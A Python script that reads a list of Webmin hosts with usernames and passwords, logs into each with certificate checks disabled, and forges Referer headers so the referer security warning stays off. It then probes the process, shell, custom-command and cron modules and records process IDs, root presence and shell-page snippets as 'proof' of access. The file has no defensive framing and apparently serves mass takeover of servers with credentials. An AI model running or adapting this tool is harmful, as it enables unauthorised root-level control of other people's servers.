#!/usr/bin/env python3
"""Webmin with proper Referer -> modules unlock."""
import sys,json,re,requests,urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) Chrome/126 Safari/537.36"}
def login(host,u,pw):
    base="https://"+host
    s=requests.Session(); s.verify=False
    s.headers.update({**UA,"Referer":base+"/"})
    s.get(base+"/",timeout=20,allow_redirects=False)
    s.get(base+"/session_login.cgi",timeout=20)
    s.post(base+"/session_login.cgi",data={"user":u,"pass":pw,"save":"1"},
           headers={"Referer":base+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
           timeout=20,allow_redirects=True)
    s.headers["Referer"]=base+"/"
    return (s,base) if s.cookies.get("sid") else (None,None)
def go(host,u,pw):
    out={"host":host}
    s,base=login(host,u,pw)
    if not s: out["err"]="login"; return out
    for mod in ("proc","shell","custom","cron"):
        try:
            s.headers["Referer"]=f"{base}/{mod}/"
            r=s.get(f"{base}/{mod}/",timeout=20); t=r.text or ""
            warn="Security Warning" in t
            out[mod]={"code":r.status_code,"len":len(t),"warn":warn,
                      "title":(re.search(r"<title[^>]*>([^<]{0,50})",t,re.I) or [None,None])[1]}
            if mod=="proc" and not warn:
                # process table proof
                pids=re.findall(r"<td[^>]*>(\d+)</td>",t)[:10]
                out["proc_pids"]=pids
                out["proc_has_root"]=("root" in t)
                out["proc_snip"]=re.sub(r"\s+"," ",re.sub(r"<[^>]+>"," ",t))[:300]
            if mod=="shell" and not warn:
                out["shell_snip"]=re.sub(r"\s+"," ",re.sub(r"<[^>]+>"," ",t))[:250]
        except Exception as e:
            out[mod]={"err":str(e)[:60]}
    return out
for line in open(sys.argv[1]):
    line=line.strip()
    if not line: continue
    h,u,pw=line.split("|")
    try: print(json.dumps(go(h,u,pw))[:2200],flush=True)
    except Exception as e: print(json.dumps({"host":h,"fatal":str(e)[:80]}),flush=True)
